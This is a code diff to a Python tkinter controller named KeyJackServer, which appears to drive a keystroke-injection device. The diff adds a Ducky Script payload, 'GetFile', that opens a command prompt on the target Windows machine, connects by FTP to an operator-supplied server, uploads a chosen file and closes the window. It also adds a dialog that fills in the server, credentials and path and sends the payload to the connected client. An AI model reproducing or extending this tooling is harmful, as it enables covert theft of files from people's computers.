@@ -3,7 +3,8 @@ import threading
 import tkinter as tk
 from tkinter import filedialog, font, messagebox, ttk
 import os
-
+IP ='127.0.0.1'
+PORT = 10319 
 
 class KeyJackServer:
     def __init__(self):
@@ -58,6 +59,35 @@ STRING calc.exe
 ENTER
 """,
                 "description": "Ducky Script that opens Calculator"
+            },
+            "GetFile":{
+                "content":"""
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 600
+STRING cd %USERPROFILE%
+ENTER
+STRING ftp -i SERVER
+ENTER
+DELAY 800
+STRING user
+ENTER
+DELAY 200
+STRING password
+ENTER
+DELAY 200
+STRING PUT FILE_PATH
+ENTER
+DELAY 3000
+STRING quit
+ENTER
+DELAY 200
+ALT F4
+STRING N""",
+                "description": "Ducky Script that uploads file to ftp server"
+
             }
         }
         self.connected_client = None
@@ -164,11 +194,51 @@ ENTER
         if selected_file in self.file_repository:
             content = self.file_repository[selected_file]["content"]
             if content:
-                self.send_message_to_client(selected_file, content)
+                if selected_file == 'GetFile':
+                    self.get_ftp_details_and_send(content)
+                else:
+                    self.send_message_to_client(selected_file, content)
             else:
                 self.update_command_center("Error: File content is empty.")
         else:
             self.update_command_center("No file selected from repository.")
+
+    def get_ftp_details_and_send(self, content):
+        def on_submit():
+            username = username_entry.get()
+            password = password_entry.get()
+            server = server_entry.get()
+            file_path = file_path_entry.get()
+
+            updated_content = content.replace("SERVER", server).replace("user", username).replace("password", password).replace("FILE_PATH", file_path)
+            print(updated_content)
+            self.send_message_to_client("GetFile", updated_content)
+            details_window.destroy()
+
+        details_window = tk.Toplevel(self.root)
+        details_window.title("Enter FTP Details")
+        details_window.geometry("400x250")
+        details_window.configure(bg='#001933')
+
+        tk.Label(details_window, text="FTP Server:", bg='#001933', fg='#00FF00', font=self.cyber_font).pack(pady=5)
+        server_entry = tk.Entry(details_window, font=self.cyber_font)
+        server_entry.pack(pady=5)
+
+        tk.Label(details_window, text="Username:", bg='#001933', fg='#00FF00', font=self.cyber_font).pack(pady=5)
+        username_entry = tk.Entry(details_window, font=self.cyber_font)
+        username_entry.pack(pady=5)
+
+        tk.Label(details_window, text="Password:", bg='#001933', fg='#00FF00', font=self.cyber_font).pack(pady=5)
+        password_entry = tk.Entry(details_window, font=self.cyber_font, show="*")
+        password_entry.pack(pady=5)
+
+        tk.Label(details_window, text="File Path:", bg='#001933', fg='#00FF00', font=self.cyber_font).pack(pady=5)
+        file_path_entry = tk.Entry(details_window, font=self.cyber_font)
+        file_path_entry.pack(pady=5)
+
+        submit_button = tk.Button(details_window, text="Submit", command=on_submit, bg='#00FF00', fg='#000000', font=self.cyber_font)
+        submit_button.pack(pady=10)
+
 
     def add_custom_file(self):
         file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
@@ -190,7 +260,7 @@ ENTER
     def setup_network(self):
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.server_socket.bind(('172.20.10.5', 10319))
+        self.server_socket.bind((IP, PORT))
         self.server_socket.listen(1)
 
         threading.Thread(target=self.accept_connections, daemon=True).start()
